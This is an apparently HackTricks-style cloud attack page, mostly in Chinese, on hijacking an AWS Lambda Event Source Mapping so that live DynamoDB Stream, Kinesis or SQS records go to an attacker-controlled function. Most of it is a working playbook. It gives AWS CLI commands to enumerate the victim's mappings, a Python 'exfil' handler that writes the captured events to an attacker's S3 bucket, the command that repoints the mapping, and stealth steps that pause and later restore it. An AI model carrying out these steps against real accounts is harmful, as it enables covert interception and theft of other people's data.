# AWS - Hijack Event Source Mapping to Redirect Stream/SQS/Kinesis to Attacker Lambda

{{#include ../../../../banners/hacktricks-training.md}}

滥用 `UpdateEventSourceMapping` 来更改现有 Event Source Mapping (ESM) 的目标 Lambda 函数，使来自 DynamoDB Streams、Kinesis 或 SQS 的记录被发送到攻击者控制的函数。这会在不修改生产者或原始函数代码的情况下，悄悄地转移实时数据。

## Impact
- 在不修改生产者应用或受害者代码的情况下，拦截并读取现有流/队列中的实时记录。
- 通过在恶意函数中处理受害者的流量，可能导致 data exfiltration 或篡改逻辑。

## Required permissions
- `lambda:ListEventSourceMappings`
- `lambda:GetEventSourceMapping`
- `lambda:UpdateEventSourceMapping`
- Ability to deploy or reference an attacker-controlled Lambda (`lambda:CreateFunction` or permission to use an existing one).

## Steps

1) 枚举受害函数的 Event Source Mappings
```
TARGET_FN=<victim-function-name>
aws lambda list-event-source-mappings --function-name $TARGET_FN \
--query 'EventSourceMappings[].{UUID:UUID,State:State,EventSourceArn:EventSourceArn}'
export MAP_UUID=$(aws lambda list-event-source-mappings --function-name $TARGET_FN \
--query 'EventSourceMappings[0].UUID' --output text)
export EVENT_SOURCE_ARN=$(aws lambda list-event-source-mappings --function-name $TARGET_FN \
--query 'EventSourceMappings[0].EventSourceArn' --output text)
```
2) 准备一个由攻击者控制的接收器 Lambda（same region；ideally similar VPC/runtime）
```
cat > exfil.py <<'PY'
import json, boto3, os, time

def lambda_handler(event, context):
print(json.dumps(event)[:3000])
b = os.environ.get('EXFIL_S3')
if b:
k = f"evt-{int(time.time())}.json"
boto3.client('s3').put_object(Bucket=b, Key=k, Body=json.dumps(event))
return {'ok': True}
PY
zip exfil.zip exfil.py
ATTACKER_LAMBDA_ROLE_ARN=<role-with-logs-(and optional S3)-permissions>
export ATTACKER_FN_ARN=$(aws lambda create-function \
--function-name ht-esm-exfil \
--runtime python3.11 --role $ATTACKER_LAMBDA_ROLE_ARN \
--handler exfil.lambda_handler --zip-file fileb://exfil.zip \
--query FunctionArn --output text)
```
3) 将映射重新指向攻击者函数
```
aws lambda update-event-source-mapping --uuid $MAP_UUID --function-name $ATTACKER_FN_ARN
```
4) 在源上生成一个事件以触发映射 (例如: SQS)
```
SOURCE_SQS_URL=<queue-url>
aws sqs send-message --queue-url $SOURCE_SQS_URL --message-body '{"x":1}'
```
5) 验证攻击者函数是否接收到该批次
```
aws logs filter-log-events --log-group-name /aws/lambda/ht-esm-exfil --limit 5
```
6) 可选的隐匿
```
# Pause mapping while siphoning events
aws lambda update-event-source-mapping --uuid $MAP_UUID --enabled false

# Restore original target later
aws lambda update-event-source-mapping --uuid $MAP_UUID --function-name $TARGET_FN --enabled true
```
注意：
- 对于 SQS ESM，处理该队列的 Lambda 的执行角色需要 `sqs:ReceiveMessage`、`sqs:DeleteMessage` 和 `sqs:GetQueueAttributes`（托管策略：`AWSLambdaSQSQueueExecutionRole`）。
- ESM 的 UUID 保持不变；只有其 `FunctionArn` 被更改，因此生产者和源 ARN 不受影响。

{{#include ../../../../banners/hacktricks-training.md}}
